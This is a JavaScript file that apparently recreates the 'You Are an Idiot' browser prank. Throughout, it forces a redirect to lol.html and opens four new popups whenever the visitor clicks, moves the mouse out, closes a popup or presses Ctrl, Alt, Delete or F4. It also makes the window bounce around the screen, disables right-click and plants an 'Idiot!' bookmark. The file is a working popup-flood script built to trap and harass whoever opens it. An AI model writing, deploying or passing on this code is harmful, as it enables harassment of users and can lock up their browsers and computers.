function checkAndRedirect() {
    if (document.hasFocus() && !window.location.pathname.includes('/lol.html')) {
        window.location.href = 'lol.html';
    }
}

checkAndRedirect();
window.addEventListener('focus', checkAndRedirect);

/* ----------------------------
   Click handler (music init)
---------------------------- */

document.addEventListener('click', function playMusicOnce() {
    const audio = document.getElementById('youare-audio');
    const micon = document.getElementById('youare-micon');

    if (!audio || !micon) return;

    document.removeEventListener('click', playMusicOnce);
}, { once: true });

/* ----------------------------
   Audio loop
---------------------------- */

const faudio = new Audio('media/youare.mp3');

faudio.addEventListener('timeupdate', function () {
    if (this.currentTime > this.duration - 0.45) {
        this.currentTime = 0;
        this.play();
    }
});

/* ----------------------------
   Bookmark
---------------------------- */

function bookmark() {
    if (
        navigator.appName === "Microsoft Internet Explorer" &&
        parseInt(navigator.appVersion) >= 4
    ) {
        window.external.AddFavorite("lol.html", "Idiot!");
    }
}

/* ----------------------------
   Window tracking
---------------------------- */

const openWindows = [];

document.addEventListener("mousemove", e => {
    mouseX = e.clientX;
    mouseY = e.clientY;
});

/* ----------------------------
   Open window
---------------------------- */

function openWindow(url) {
    const width = Math.round(window.screen.width * 0.1875);
    const height = Math.round(window.screen.height * 0.2222);

    const left = Math.floor((screen.width - width) / 2);
    const top = Math.floor((screen.height - height) / 2);

    const features =
        `menubar=no,status=no,toolbar=no,resizable=no,` +
        `width=${width},height=${height},left=${left},top=${top},` +
        `noopener,noreferrer`;

    const w = window.open(url, "_blank", features);

    if (w) {
        openWindows.push(w);
    }

    return w;
}

/* ----------------------------
   Spawn system
---------------------------- */

function proCreate() {
    for (let i = 0; i < 4; i++) {
        openWindow('lol.html');
    }
}

/* ----------------------------
   INSTANT CLOSE HOOK (postMessage)
---------------------------- */

let closeCooldown = false;

window.addEventListener("message", (e) => {
    if (e.data?.type === "popup_closed") {
        handlePopupClosed();
    }
});

function handlePopupClosed() {
    if (closeCooldown) return;

    closeCooldown = true;

    proCreate();

    setTimeout(() => {
        closeCooldown = false;
    }, 200);
}

/* ----------------------------
   SAFETY FALLBACK (minimal polling)
---------------------------- */

setInterval(() => {
    for (let i = openWindows.length - 1; i >= 0; i--) {
        if (!openWindows[i] || openWindows[i].closed) {
            openWindows.splice(i, 1);
            handlePopupClosed();
            break;
        }
    }
}, 300);

/* ----------------------------
   Movement system
---------------------------- */

let xOff = 18, yOff = 18;
let xPos = 400, yPos = -100;
let flagRun = 1;

function newXlt() { xOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
function newXrt() { xOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }
function newYup() { yOff = Math.ceil(-6 * Math.random()) * 5 - 10; window.focus(); }
function newYdn() { yOff = Math.ceil(7 * Math.random()) * 5 - 10; window.focus(); }

function fOff() { flagRun = 0; }

function playBall() {
    xPos += xOff;
    yPos += yOff;

    if (xPos > screen.width - 357) newXlt();
    if (xPos < 0) newXrt();
    if (yPos > screen.height - 330) newYup();
    if (yPos < 0) newYdn();

    if (flagRun === 1) {
        try {
            window.moveTo(xPos, yPos);
        } catch (e) {
            flagRun = 0;
        }

        setTimeout(playBall, 16);
    }
}

/* ----------------------------
   Events
---------------------------- */

window.onload = function () {
    flagRun = 1;
    playBall();
    bookmark();
};

window.onmouseout = function () {
    proCreate();
};

window.onclick = function () {
    proCreate();
};

window.oncontextmenu = function () {
    return false;
};

window.onkeydown = function (event) {
    const keyCode = event.keyCode;
    if ([17, 18, 46, 115].includes(keyCode)) {
        proCreate();
    }
};

/* window.onbeforeunload = function () {
    return " ";
}; */
